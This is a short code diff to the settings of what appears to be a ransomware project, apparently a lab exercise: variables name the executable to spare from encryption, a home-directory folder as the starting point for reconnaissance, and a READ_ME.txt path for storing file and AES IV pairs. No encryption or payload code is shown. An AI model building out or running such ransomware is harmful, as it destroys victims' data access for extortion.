@@ -5,13 +5,16 @@ whoweare = "APT-Al"
 
 # prevent self-encryption
 whatismyname = "zararliyim.exe"
+whatismypurpose = """
+                    Explain our aim
+                  """
 
 # the beginning point of recon
 root_directory = os.path.expanduser('~')
 root_directory = os.path.join(root_directory,"test2")
 
 # where to write the pairs made up of a file and AES IV
-aesIV_File_store_path = "/home/kali/desktop"
+aesIV_File_store_path = "/home/kali/Desktop/READ_ME.txt"
 
 
 os_name = os.name
